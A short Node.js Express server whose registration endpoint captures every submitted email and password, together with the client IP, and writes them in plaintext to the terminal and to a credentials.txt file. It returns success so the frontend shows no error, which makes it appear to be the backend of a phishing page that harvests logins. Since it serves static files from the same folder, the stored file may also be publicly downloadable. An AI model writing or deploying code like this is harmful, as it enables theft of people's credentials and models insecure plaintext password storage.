const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Parse JSON bodies
app.use(bodyParser.json());

// Serve all static files (your HTML, CSS, JS)
app.use(express.static(path.join(__dirname)));

// Capture registration data
app.post('/api/register', (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();

  const logEntry = `
========================================
TIME : ${timestamp}
EMAIL : ${email}
PASSWORD : ${password}
IP : ${req.ip}
========================================
`;

  // Print to terminal
  console.log(logEntry);

  // Append to a file
  fs.appendFile('credentials.txt', logEntry + '\n', (err) => {
    if (err) console.error('Failed to write file:', err);
  });

  // Send success response so the frontend doesn’t see an error
  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
